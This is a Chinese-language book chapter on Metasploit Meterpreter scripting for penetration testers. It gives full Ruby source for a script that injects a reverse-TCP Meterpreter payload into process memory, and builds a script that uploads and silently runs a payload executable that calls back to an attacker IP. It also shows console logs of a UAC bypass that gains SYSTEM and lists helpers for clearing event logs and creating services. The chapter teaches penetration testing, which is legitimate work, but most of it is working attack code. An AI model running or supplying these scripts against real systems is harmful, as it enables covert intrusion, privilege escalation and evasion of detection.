## 第十六章。Meterpreter 脚本编程

Metasploit 强大的脚本环境允许你向 Meterpreter 添加功能或选项。在本章中，你将学习 Meterpreter 脚本的基础知识，一些有用的本地调用，以及如何在 Meterpreter 内部运行这些命令。我们将介绍两种利用 Meterpreter 脚本的方法。第一种方法有些过时，但仍然很重要，因为并非所有脚本都已转换。第二种方法几乎与第十三章中讨论的方法相同，因此我们不会在本章中详细说明。（特别感谢 Carlos Perez [darkoperator]对这一章的贡献。）

## Meterpreter 脚本编程基础

所有 Meterpreter 脚本都位于 Framework 根目录下的*scripts/meterpreter/*下。要显示所有脚本的列表，在 Meterpreter 外壳中按 Tab 键，输入**`run`**，然后再次按 Tab 键。

让我们剖析一个简单的 Meterpreter 脚本，然后构建我们自己的。我们将探索`multi_meter_inject`脚本，该脚本将 Meterpreter 外壳注入到不同的进程中。首先，查看 Meterpreter 中的此脚本，以了解包含哪些标志和语法：

```
meterpreter > `run multi_meter_inject -h`
Meterpreter script for injecting a reverse tcp Meterpreter
 payload into memory space of
multiple PID's. If none is provided, notepad.exe will be spawned and the meterpreter
payload injected into it.

OPTIONS:

    -h           Help menu.
    -m         Start Exploit multi/handler for return connection
    -mp <opt>
  Provide Multiple PID for connections separated by comma one per IP.
    -mr <opt>
  Provide Multiple IP Addresses for Connections separated by comma.
    -p  <opt>  The
 port on the remote host where Metasploit is listening (default: 4444)
    -pt   <opt>  Specify Reverse Connection Meterpreter Payload. Default windows/
                     meterpreter/reverse_tcp

meterpreter >
```

第一个选项是`-m`标志 ![图片](img/00002.gif)，它将自动为我们设置返回连接上的新处理程序。如果我们打算使用相同的端口（例如，443），则不需要设置此选项。接下来，我们指定所需的进程 ID（PIDs） ![图片](img/00004.gif)以及它们将被注入的外壳。

Meterpreter 仅在内存中执行。当我们注入进程时，我们实际上是将 Meterpreter 注入到该进程的内存空间中。这使我们能够保持隐蔽，永远不会读取或写入磁盘上的文件，同时最终为我们提供多个外壳。

然后，我们设置攻击机器上的 IP 地址 ![图片](img/00005.gif) 和端口号 ![图片](img/00006.gif)，以便新的 Meterpreter 会话连接到。

我们在 Meterpreter 中发出`ps`命令以获取正在运行的进程列表：

```
meterpreter > `ps`

Process list
============

 PID   Name                 Arch  Session  User                  Path
 ---   ----                 ----  -------  ----                  ----
 0     [System Process]
 4     System
 256   smss.exe
 364   csrss.exe
 412   wininit.exe
 424   csrss.exe
 472   winlogon.exe
 516   services.exe
 524   lsass.exe
 532   lsm.exe
 2808  iexplorer.exe      x86
meterpreter >
```

我们将我们的新 Meterpreter 外壳注入到*iexplorer.exe* ![图片](img/00002.gif)进程中。这将完全在内存中生成第二个 Meterpreter 控制台，并且永远不会写入磁盘。

让我们使用之前审查的一些开关运行`multi_meter_inject`命令，看看它是否工作：

```
meterpreter > `run multi_meter_inject -mp 2808 -mr 172.16.32.129 -p 443`
  [*] Creating a reverse meterpreter stager: LHOST=172.16.32.129 LPORT=443
  [*] Injecting meterpreter into process ID 2808
  [*] Allocated memory at address 0x03180000, for 290 byte stager
  [*] Writing the stager into memory...
  [*] Sending stage (749056 bytes) to 172.16.32.170
  [+] Successfully injected Meterpreter in to process: 2808
 [*] Meterpreter session 3 opened (172.16.32.129:443 -> 172.16.32.170:1098) at
      Tue Nov 30 22:37:29 −0500 2010
  meterpreter >
```

如此输出所示，我们的命令已成功执行，并已打开一个新的 Meterpreter 会话，如图所示 ![图片](img/00002.gif)。

现在我们已经了解了这个脚本能做什么，让我们来检查它是如何工作的。我们将把脚本分解成块，以帮助我们解析其命令和整体结构。

首先，定义变量和定义，并设置我们想要传递给 Meterpreter 的标志：

```
# $Id: multi_meter_inject.rb 10901 2010-11-04 18:42:36Z darkoperator $
  # $Revision: 10901 $
  # Author: Carlos Perez at carlos_perez[at]darkoperator.com
  #-----------------------------------------------------------------------------
  ################## Variable Declarations ##################

  @client  = client
  lhost    = Rex::Socket.source_address("1.2.3.4")
  lport    = 4444
  lhost    = "127.0.0.1"
 pid = nil
  multi_ip = nil
  multi_pid = []
  payload_type = "windows/meterpreter/reverse_tcp"
  start_handler = nil
 @exec_opts = Rex::Parser::Arguments.new(
          "-h"  => [ false,  "Help menu." ],
          "-p"  => [ true,   "The port on the remote host where
 Metasploit is              listening (default: 4444)"],
          "-m"  => [ false,  "Start Exploit multi/handler for return connection"],
          "-pt" => [ true,   "Specify Reverse Connection
 Meterpreter Payload.              Default windows/meterpreter/reverse_tcp"],
          "-mr" => [ true,   "Provide Multiple IP Addresses
 for Connections              separated by comma."],
          "-mp" => [ true,   "Provide Multiple PID for connections
 separated by              comma one per IP."]
  )
  meter_type = client.platform
```

在此脚本部分的开始处，请注意定义了几个用于后续使用的变量。例如，`pid = nil` 在 ![](img/00002.gif) 处创建了一个 PID 变量，但其值尚未设置。`@exec_opts = Rex::Parser::Arguments.new(` 部分，在 ![](img/00004.gif) 处定义了将使用的附加帮助命令和标志。

下一个部分定义了我们将稍后调用的函数：

```
################## Function Declarations ##################

  # Usage Message Function
  #-------------------------------------------------------------------------------
 def usage
          print_line "Meterpreter Script for injecting a reverse
 tcp Meterpreter Payload"
          print_line "in to memory of multiple PID's, if none is
 provided a notepad process."
          print_line "will be created and a Meterpreter Payload
 will be injected in to each."
          print_line(@exec_opts.usage)
          raise Rex::Script::Completed
  end

  # Wrong Meterpreter Version Message Function
  #-------------------------------------------------------------------------------
  def wrong_meter_version(meter = meter_type)
          print_error("#{meter} version of Meterpreter is not
 supported with this Script!")
          raise Rex::Script::Completed
  end

  # Function for injecting payload in to a given PID
  #-------------------------------------------------------------------------------
 def inject(target_pid, payload_to_inject)
          print_status("Injecting meterpreter into process ID #{target_pid}")
          begin
                  host_process = @client.sys.process.open
(target_pid.to_i, PROCESS_ALL_ACCESS)
                  raw = payload_to_inject.generate

mem = host_process.memory.allocate(raw.length + (raw.length % 1024))

                  print_status("Allocated memory at
 address #{"0x%.8x" % mem}, for                       #{raw.length} byte stager")
                  print_status("Writing the stager into memory...")
                host_process.memory.write(mem, raw)
                host_process.thread.create(mem, 0)
                  print_good("Successfully injected Meterpreter
 in to process: #{target_pid}")
          rescue::Exception => e
                  print_error("Failed to Inject Payload to #{target_pid}!")
                  print_error(e)
          end
  end
```

在此示例中，当 `-h` 标志被设置时，将调用 `usage` 函数在 ![](img/00002.gif)。你可以直接从 Meterpreter API 调用许多 Meterpreter 函数。这种功能简化了某些任务，例如使用 `def inject` 函数注入到新的进程，如下所示在 ![](img/00004.gif)。

下一个重要元素是在 ![](img/00005.gif) 处的 `host_process.memory.allocate` 调用，这将使我们能够为我们的 Meterpreter 有效载荷分配内存空间。然后我们使用 `host_process.memory.write` 在 ![](img/00006.gif) 处将内存写入我们的进程，并使用 `host_process.thread.create` 在 ![](img/00007.gif) 处创建一个新的线程。

接下来我们定义一个多处理器，它根据所选的有效载荷处理连接，如下所示（粗体）。（默认是 Meterpreter，所以多处理器将处理 Meterpreter 会话，除非另有说明。）

```
# Function for creation of connection handler
#-------------------------------------------------------------------------------
`def create_multi_handler(payload_to_inject)`
        mul = @client.framework.exploits.create("multi/handler")
        mul.share_datastore(payload_to_inject.datastore)
        mul.datastore['WORKSPACE'] = @client.workspace
        mul.datastore['PAYLOAD'] = payload_to_inject
        mul.datastore['EXITFUNC'] = 'process'
        mul.datastore['ExitOnSession'] = true
        print_status("Running payload handler")
        mul.exploit_simple(
                'Payload'  => mul.datastore['PAYLOAD'],
                'RunAsJob' => true
        )

end
```

在以下部分中的 `pay = client.framework.payloads.create(payload)` 调用允许我们从 Metasploit 框架创建一个有效载荷。因为我们知道这是一个 Meterpreter 有效载荷，Metasploit 将自动为我们生成它。

```
# Function for Creating the Payload
#-------------------------------------------------------------------------------
def create_payload(payload_type,lhost,lport)
        print_status("Creating a reverse meterpreter
 stager: LHOST=#{lhost} LPORT=#{lport}")
        payload = payload_type
        `pay = client.framework.payloads.create(payload)`
        pay.datastore['LHOST'] = lhost
        pay.datastore['LPORT'] = lport
        return pay
end
```

下一个选项默认使用记事本启动一个进程。如果我们没有指定进程，它将自动为我们创建一个记事本进程。

```
# Function that starts the notepad.exe process
#-------------------------------------------------------------------------------
def start_proc()
        print_good("Starting Notepad.exe to house Meterpreter Session.")
        `proc = client.sys.process.execute('notepad.exe', nil, {'Hidden' => true })`
        print_good("Process created with pid #{proc.pid}")
        return proc.pid
end
```

粗体调用使我们能够在操作系统上执行任何命令。注意，`Hidden` 被设置为 `true`。这意味着另一边的用户（目标）将看不到任何东西；如果打开记事本，它将在目标用户不知情的情况下运行。

接下来我们调用我们的函数，抛出 if 语句，并启动有效载荷：

```
################## Main ##################
@exec_opts.parse(args) { |opt, idx, val|
        case opt
        when "-h"
                usage
        when "-p"
                lport = val.to_i
        when "-m"
                start_handler = true
        when "-pt"
                payload_type = val
        when "-mr"
                multi_ip = val.split(",")
        when "-mp"
                multi_pid = val.split(",")
        end
}

# Check for Version of Meterpreter
wrong_meter_version(meter_type) if meter_type !˜ /win32|win64/i
# Create a Multi Handler is Desired
create_multi_handler(payload_type) if start_handler
```

最后，我们进行一些检查，确保语法正确，并将我们的新 Meterpreter 会话注入到我们的 PID 中：

```
# Check for a PID or program name

if multi_ip
        if multi_pid
                if multi_ip.length == multi_pid.length
                        pid_index = 0
                        multi_ip.each do |i|
                                payload = create_payload(payload_type,i,lport)
                                inject(multi_pid[pid_index],payload)
                                select(nil, nil, nil, 5)
                                pid_index = pid_index + 1
                        end
                else
                        multi_ip.each do |i|
                                payload = create_payload(payload_type,i,lport)
                                inject(start_proc,payload)
                                select(nil, nil, nil, 2)
                        end
                end
        end
else
        print_error("You must provide at least one IP!")
end
```

## Meterpreter API

在渗透测试期间，你可能无法找到与所需任务匹配的现有脚本。如果你理解编程的基本概念，那么你应该能够相对容易地掌握 Ruby 语法，并使用它来编写额外的脚本。

让我们从使用交互式 Ruby 壳（也称为 `irb`）的基本打印语句开始。从 Meterpreter 控制台，输入 **`irb`** 命令并开始输入命令：

```
meterpreter > `irb`
[*] Starting IRB shell
[*] The 'client' variable holds the meterpreter client
>>
```

在你进入交互式外壳后，你可以使用它来测试来自 Meterpreter 的不同 API 调用。

### 打印输出

让我们从 `print_line()` 调用开始，这将打印输出并在末尾添加换行符：

```
>> `print_line("you have been pwnd!")`
you have been pwnd!
=> nil
```

下一个调用是`print_status()`，在脚本语言中使用最为频繁。此调用将提供换行符并打印正在执行的内容的状态，前面带有`[*]`前缀：

```
>> `print_status("you have been pwnd!")`
[*] you have been pwnd!
=> nil
```

下一个调用是`print_good()`，用于提供操作的结果或指示操作成功：

```
>> `print_good("you have been pwnd")`
[+] you have been pwnd
=> nil
```

下一个调用是`print_error()`，用于提供错误消息或指示操作不可行：

```
>> `print_error("you have been pwnd!")`
[-] you have been pwnd!
=> nil
```

### 基础 API 调用

Meterpreter 包含许多 API 调用，您可以在脚本中使用它们以提供额外的功能或定制。您可以使用几个参考点来查找这些 API 调用。脚本新手最常使用的参考点是查看 Meterpreter 控制台用户界面（UI）如何使用这些调用；这些可以作为编写脚本的起点。要访问此代码，请阅读 Back|Track 中`/opt/framework3/msf3/lib/rex/post/meterpreter/ui/console/command_dispatcher/`目录下的文件。如果您创建了一个文件夹内容的列表，您可以看到包含您可以使用各种命令的文件：

```
root@bt:˜# `ls -F /opt/framework3/`
`msf3/lib/rex/post/meterpreter/ui/console/command_dispatcher/`

core.rb  espia.rb  incognito.rb  networkpug.rb  priv/
  priv.rb  sniffer.rb  stdapi/  stdapi.rb
```

在这些脚本中包含了各种 Meterpreter 核心、桌面交互、特权操作以及许多其他命令。通过审查这些脚本，您可以深入了解 Meterpreter 在受侵害系统中的操作方式。

### Meterpreter 混入

Meterpreter 混入（mixins）是一系列表示在 Meterpreter 脚本中执行的最常见任务的调用。这些调用在`irb`中不可用，只能在为 Meterpreter 创建脚本时使用。以下是其中一些最显著的调用列表：

| **`cmd_exec(cmd)`** 以隐藏和通道化的方式执行给定的命令。命令的输出以多行字符串的形式提供。 |
| --- |
| **`eventlog_clear(evt = "")`** 清除给定的事件日志或如果没有提供则清除所有事件日志。返回一个包含已清除事件日志的数组。 |
| **`eventlog_list()`** 列出事件日志并返回一个包含事件日志名称的数组。 |
| **`file_local_digestmd5(file2md5)`** 返回给定本地文件的 MD5 校验和字符串。 |
| **`file_local_digestsha1(file2sha1)`** 返回给定本地文件的 SHA1 校验和字符串。 |
| **`file_local_digestsha2(file2sha2)`** 返回给定本地文件的 SHA256 校验和字符串。 |
| **`file_local_write(file2wrt, data2wrt)`** 将给定的字符串写入指定的文件。 |
| **`is_admin?()`** 识别用户是否为管理员。如果用户是管理员则返回`true`，否则返回`false`。 |
| **`is_uac_enabled?()`** 确定系统上是否启用了用户账户控制（UAC）。 |
| **`registry_createkey(key)`** 创建给定的注册表键，如果成功则返回`true`。 |
| **`registry_deleteval(key,valname)`** 根据键和值名称删除注册表值。如果成功则返回`true`。 |
| **`registry_delkey(key)`** 删除给定的注册表键，如果成功则返回`true`。 |
| **`registry_enumkeys(key)`** 列出给定注册表键的子键，并返回子键数组。 |
| **`registry_enumvals(key)`** 列出给定注册表键的值，并返回值名称数组。 |
| **`registry_getvaldata(key,valname)`** 返回给定注册表键及其值的值数据。 |
| **`registry_getvalinfo(key,valname)`** 返回给定注册表键及其值的数据和类型。 |
| **`registry_setvaldata(key,valname,data,type)`** 设置目标注册表上给定值的数据和数据类型。如果成功，则返回`true`。 |
| **`service_change_startup(name,mode)`** 更改指定服务的启动模式。必须提供名称和模式。模式是一个字符串集合，可以是相应的自动、手动或禁用设置。服务名称区分大小写。 |
| **`service_create(name, display_name, executable_on_host,startup=2)`** 用于创建运行其自身进程的服务。其参数为服务名称（字符串）、显示名称（字符串）、在启动时将在主机上执行的可执行文件路径（字符串）以及启动类型（整数）：`2`为自动，`3`为手动，或`4`为禁用（默认为自动）。 |
| **`service_delete(name)`** 通过删除注册表中的键来删除服务。 |
| **`service_info(name)`** 获取 Windows 服务信息。信息以哈希表形式返回，包含显示名称、启动模式和由服务执行命令。服务名称区分大小写。哈希键为`Name`、`Start`、`Command`和`Credentials`。 |
| **`service_list()`** 列出所有现有的 Windows 服务。返回包含服务名称的数组。 |
| **`service_start(name)`** 用于服务启动的函数。如果服务已启动，则返回`0`；如果服务已启动，则返回`1`；如果服务已禁用，则返回`2`。 |
| **`service_stop(name)`** 用于停止服务的函数。如果成功停止服务，则返回`0`；如果服务已停止或禁用，则返回`1`；如果无法停止服务，则返回`2`。 |

你应该了解有关你可以用于向自定义脚本添加功能的基础 Meterpreter 混入调用。

## 编写 Meterpreter 脚本的规则

在创建 Meterpreter 脚本之前，你需要了解以下规则，以便开始编写第一个脚本，并且如果要将它们提交到框架：

+   只使用实例、局部和常量变量；永远不要使用全局或类变量，因为它们可能会与框架变量冲突。

+   使用硬制表符进行缩进；不要使用空格。

+   对于代码块，不要使用`{}`。而是使用`do`和`end`。

+   在声明函数时，总是在声明之前写一个注释，并简要描述其目的。

+   不要使用`sleep`；使用`"select(nil, nil, nil, <time>)"`。

+   不要使用`puts`或任何其他标准输出调用；而是使用`print`、`print_line`、`print_status`、`print_error`和`print_good`。

+   总是包含一个`-h`选项，它会打印出脚本的描述和用途，并显示可用的选项。

+   如果您的脚本针对特定的操作系统或 Meterpreter 平台，请确保它只在这些平台上运行，并在不支持的操作系统或平台上打印出错误信息。

## 创建您自己的 Meterpreter 脚本

打开您最喜欢的编辑器，创建一个名为 *execute_upload.rb* 的新文件，位于 *scripts/meterpreter/* 目录下。我们将首先在文件顶部添加注释，让每个人都知道这个脚本的目的，并定义脚本选项：

```
# Meterpreter script for uploading and executing another meterpreter exe

info = "Simple script for uploading and executing an additional meterpreter payload"

# Options

opts = Rex::Parser::Arguments.new(
        "-h"  => [ false,
   "This help menu. Spawn a meterpreter shell by
 uploading and               executing."],
        "-r"  => [ true,
    "The IP of a remote Metasploit listening for the connect back"],
        "-p"  => [ true,    "The port
 on the remote host where Metasploit is listening               (default: 4444)"]
)
```

这看起来应该很熟悉，因为它几乎与本章前面出现的 Carlos Perez 的示例完全相同。帮助信息使用`-h`在 ![](img/00002.gif) 定义，`-r`和`-p`指定了我们需要的新 Meterpreter 可执行文件的远程 IP 地址 ![](img/00004.gif) 和端口号 ![](img/00005.gif)。请注意，包含了一个`true`语句；这表示这些字段是必需的。

接下来，我们定义在整个脚本中想要使用的变量。我们将调用`Rex::Text.rand_text_alpha`函数，以便每次调用时都创建一个唯一的可执行文件名。这是高效的，因为我们不希望静态分配可执行文件名，这样会“病毒指纹”攻击。我们还将配置每个参数，使其要么分配一个值，要么使用例如`-h`打印信息。

```
filename= Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
rhost    = Rex::Socket.source_address("1.2.3.4")
rport    = 4444
lhost    = "127.0.0.1"
pay      = nil

#
# Option parsing
#
opts.parse(args) do |opt, idx, val|
        case opt
        when "-h"
                print_line(info)
                print_line(opts.usage)
                raise Rex::Script::Completed

        when "-r"
                rhost = val
        when "-p"
                rport = val.to_i

        end

end
```

注意，我们将每个参数都分离出来，并分配值或向用户打印信息。`rhost = val` ![](img/00002.gif) 表示“当输入`-r`时，获取用户提供的值。”`rport = val.to_i` ![](img/00004.gif) 简单地将值分配为整数（对于端口号来说，它始终需要是整数）。

在下一系列中，我们定义创建有效载荷所需的所有内容：

```
 payload = "windows/meterpreter/reverse_tcp"
 pay = client.framework.payloads.create(payload)
  pay.datastore['LHOST'] = rhost
  pay.datastore['LPORT'] = rport
  mul = client.framework.exploits.create("multi/handler")
  mul.share_datastore(pay.datastore)
  mul.datastore['WORKSPACE'] = client.workspace
  mul.datastore['PAYLOAD'] = payload
  mul.datastore['EXITFUNC'] = 'process'
  mul.datastore['ExitOnSession'] = true
  mul.exploit_simple(
  'Payload'  => mul.datastore['PAYLOAD'],
  'RunAsJob' => true
   )
```

我们将我们的有效载荷定义为`windows/meterpreter/reverse_tcp`，在 ![](img/00002.gif) 生成有效载荷，调用`client.framework.payloads.create(payload)`在 ![](img/00004.gif) 生成，并指定创建多处理器所需的必要参数。这些都是我们使用`LHOST`和`LPORT`选项设置有效载荷并创建监听器所需的所有字段。

接下来，我们创建我们的可执行文件（*win32pe meterpreter*），将其上传到目标机器，并执行它：

```
 if client.platform =˜ /win32|win64/

        tempdir = client.fs.file.expand_path("%TEMP%")
          print_status("Uploading meterpreter to temp directory...")
          raw = pay.generate
        exe = ::Msf::Util::EXE.to_win32pe(client.framework, raw)
          tempexe = tempdir + "\\" + filename
          tempexe.gsub!("\\\\", "\\")
          fd = client.fs.file.new(tempexe, "wb")
          fd.write(exe)
          fd.close
          print_status("Executing the payload on the system...")
          execute_payload = "#{tempdir}\\#{filename}"
         pid = session.sys.process.execute(execute_payload, nil, {'Hidden' => true})

  end
```

被称为`#{`*`something`*`}`的变量已经在脚本中定义，稍后将被调用。注意我们已经定义了`tempdir`和`filename`。进入脚本后，我们首先使用一个 if 语句来检测我们正在针对的平台是否是基于 Windows 的系统！[](../images/00002.gif)；否则，攻击不会运行。然后我们在目标机器上扩展临时目录！[](../images/00004.gif)，这相当于`%TEMP%`。接下来我们在系统上创建一个新文件，并写入从`::Msf::Util::EXE.to_win32pe`调用生成的新的*EXE*文件！[](../images/00005.gif)。记住我们设置了`session.sys.process.execute`为`Hidden`，这样目标用户就不会在他的侧看到任何弹出。

将所有这些放在一起，我们的最终脚本应该看起来像这样：

```
# Meterpreter script for uploading and executing another meterpreter exe

info = "Simple script for uploading and executing an additional meterpreter payload"

#
# Options
#

opts = Rex::Parser::Arguments.new(
       "-h"  => [ false,   "This help menu. Spawn a
 meterpreter shell by uploading and             executing."],
       "-r"  => [ true,    "The IP of a remote Metasploit
 listening for the connect back"],
       "-p"  => [ true,    "The port on the remote host where
 Metasploit is listening             (default: 4444)"]
)

#
# Default parameters
#

filename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
rhost    = Rex::Socket.source_address("1.2.3.4")
rport    = 4444
lhost    = "127.0.0.1"
pay      = nil

#
# Option parsing
#

opts.parse(args) do |opt, idx, val|
       case opt
       when "-h"
              print_line(info)
              print_line(opts.usage)
              raise Rex::Script::Completed

       when "-r"
              rhost = val
       when "-p"
              rport = val.to_i

       end

end

       payload = "windows/meterpreter/reverse_tcp"
       pay = client.framework.payloads.create(payload)
       pay.datastore['LHOST'] = rhost
       pay.datastore['LPORT'] = rport
       mul = client.framework.exploits.create("multi/handler")
       mul.share_datastore(pay.datastore)
       mul.datastore['WORKSPACE'] = client.workspace
       mul.datastore['PAYLOAD'] = payload
       mul.datastore['EXITFUNC'] = 'process'
       mul.datastore['ExitOnSession'] = true
       print_status("Running payload handler")
       mul.exploit_simple(
              'Payload'  => mul.datastore['PAYLOAD'],
              'RunAsJob' => true
       )

if client.platform =˜ /win32|win64/

       tempdir = client.fs.file.expand_path("%TEMP%")
       print_status("Uploading meterpreter to temp directory")
        raw = pay.generate
        exe = ::Msf::Util::EXE.to_win32pe(client.framework, raw)
       tempexe = tempdir + "\\" + filename
        tempexe.gsub!("\\\\", "\\")
       fd = client.fs.file.new(tempexe, "wb")
       fd.write(exe)
       fd.close
       print_status("Executing the payload on the system")
       execute_payload = "#{tempdir}\\#{filename}"
       pid = session.sys.process.execute(execute_payload, nil, {'Hidden' => true})

end
```

现在我们已经创建了新的 Meterpreter 脚本，让我们启动 Metasploit，进入 Meterpreter，并执行脚本：

```
meterpreter > `run execute_upload -r 172.16.32.129 -p 443`
[*] Running payload handler
[*] Uploading meterpreter to temp directory
[*] Executing the payload on the system
[*] Sending stage (749056 bytes) to 172.16.32.170
[*] Meterpreter session 2 opened (172.16.32.129:443 -> 172.16.32.170:1140) at
      Tue Nov 30 23:24:19 −0500 2010
meterpreter >
```

成功！我们已经创建了一个 Meterpreter 脚本，并成功执行它以生成一个新的 Meterpreter 外壳。这是 Meterpreter 脚本语言和 Ruby 的一般灵活性和强大功能的一个小例子。

简要讨论一个重要元素（如前所述）是将 Meterpreter 脚本转换为类似于 Metasploit 模块的格式。我们将使用一个用于绕过 Windows 7 UAC 的小型模块演示。Windows Vista 及以后的版本引入了一个类似于 UNIX 和 Linux 系统中的`sudo`的功能。使用这个功能，用户在被赋予管理级别权限之前被分配有限的账户权限。当用户需要管理员权限来执行任务时，会出现一个提示，告知用户需要管理员权限并且正在使用。这个功能的最终目标是防止被入侵或病毒感染，并限制仅对单个用户账户的暴露。

在 2010 年 12 月，Dave Kennedy 和 Kevin Mitnick 发布了一个新的 Meterpreter 模块，通过向具有受信任发布者证书并被认为是“UAC 安全”的进程注入有效载荷来绕过 Windows UAC 组件。在注入到进程时，可以调用 DLL，在 UAC 安全进程的上下文中运行，然后执行命令。

在这个例子中，我们使用后利用模块，这些模块可以用来绕过 UAC。我们首先使用带有`-j`标志的`*multi/handler*`模块，这允许我们接受多个 Meterpreter 外壳。注意在这个例子中，当我们尝试运行`getsystem`命令时，它失败了，因为它被 Windows UAC 阻止了。

```
resource (src/program_junk/meta_config)> exploit -j
[*] Exploit running as background job.
msf exploit(handler) >
[*] Started reverse handler on 0.0.0.0:443
[*] Starting the payload handler...
[*] Sending stage (749056 bytes) to 172.16.32.130
[*] Meterpreter session 1 opened (172.16.32.128:443 ->
 172.16.32.130:2310) at      Thu June 09 08:02:45 −0500 2011
msf exploit(handler) > sessions -i 1
[*] Starting interaction with 1...
meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: Access is denied.
meterpreter > sysinfo
Computer: DAVE-DEV-PC
OS      : Windows 7 (Build 7600).
Arch    : x64 (Current Process is WOW64)
Language: en_US
meterpreter >
```

注意我们无法桥接到系统级账户，因为 UAC 阻止了我们。我们需要绕过 UAC 以获得系统级权限，最终成为管理员，这样我们就可以进一步入侵机器。我们按 ctrl-Z 退回，保持会话活跃。然后我们使用新的格式运行后模块并绕过 Windows UAC 功能。

```
msf exploit(handler) > `use post/windows/escalate/bypassuac`
msf post(bypassuac) > `show options`
Module options (post/windows/escalate/bypassuac):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   LHOST                     no        Listener IP address for the new session
   LPORT    4444             no        Listener port for the new session
   SESSION                   yes       The session to run this module on.

msf post(bypassuac) > `set LHOST 172.16.32.128`
LHOST => 172.16.32.128
msf post(bypassuac) > `set SESSION 1`
SESSION => 1
msf post(bypassuac) > `exploit`

[*] Started reverse handler on 172.16.32.128:4444
[*] Starting the payload handler...
[*] Uploading the bypass UAC executable to the filesystem...
[*] Meterpreter stager executable 73802 bytes long being uploaded..
[*] Uploaded the agent to the filesystem....
[*] Post module execution completed
msf post(bypassuac) >
[*] Sending stage (749056 bytes) to 172.16.32.130
[*] Meterpreter session 2 opened (172.16.32.128:4444 ->
 172.16.32.130:1106) at Thu June 09
     19:50:54 −0500 2011
[*] Session ID 2 (172.16.32.128:4444 -> 172.16.32.130:1106)
 processing InitialAutoRunScript
     'migrate -f'
[*] Current server process: tYNpQMP.exe (3716)
[*] Spawning a notepad.exe host process...
[*] Migrating into process ID 3812
[*] New server process: notepad.exe (3812)

msf post(bypassuac) > `sessions -i 2`
[*] Starting interaction with 2...

meterpreter > `getsystem`
...got system (via technique 1).
meterpreter >
```

我们也可以在 Meterpreter 控制台中执行`run`而不是`use`，它将利用默认选项并执行，而无需设置各种选项。

注意在先前的示例中，我们成功在启用了 UAC 的目标机器上获得了系统级权限。这个小例子演示了后利用模块最终将被设置和转换的方式。

此脚本通过将先前编译的可执行文件上传到目标机器并运行它来工作。查看后利用模块以更好地了解幕后发生的事情：

```
root@bt:/opt/framework3/msf3# nano modules/post/windows/escalate/bypassuac.rb
```

## 总结

我们不会涵盖后利用模块的所有细节，因为它几乎与第十三章中展示的攻击相同 Chapter 13。仔细查看每一行，然后尝试构建并运行你自己的模块。

遍历现有的 Meterpreter 脚本，查看可以用来创建你自己的脚本的不同命令、调用和函数。如果你有一个新脚本的好主意，提交给 Metasploit 开发团队——谁知道呢；它可能是一个其他人也可以使用的脚本！
